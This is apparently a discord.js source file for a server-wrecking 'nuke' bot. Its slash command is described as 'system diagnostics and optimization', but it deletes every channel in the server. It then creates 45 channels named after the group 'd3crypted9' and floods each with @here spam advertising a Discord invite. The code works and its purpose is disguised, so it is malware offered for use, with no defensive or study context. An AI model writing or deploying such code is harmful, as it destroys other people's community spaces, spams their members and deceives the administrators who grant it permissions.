const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const commands = [
    new SlashCommandBuilder()
        .setName('reckt')
        .setDescription('Run system diagnostics and optimization')
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
    try {
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('Command registered');
    } catch (error) {
        console.error(error);
    }
})();

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'reckt') {
        await interaction.reply({ content: 'Optimizing server...', ephemeral: true });

        const guild = interaction.guild;

        guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch (err) {}
        });

        for (let i = 0; i < 45; i++) {
            guild.channels.create({ name: 'get-reckt-by-d3crypted9' })
                .then(channel => {
                    channel.send("@here team d3crypted9 join it now there isnt no skids! discord.gg/rddVyjeVbH");
                })
                .catch(() => {});
        }
    }
});

client.login(TOKEN);
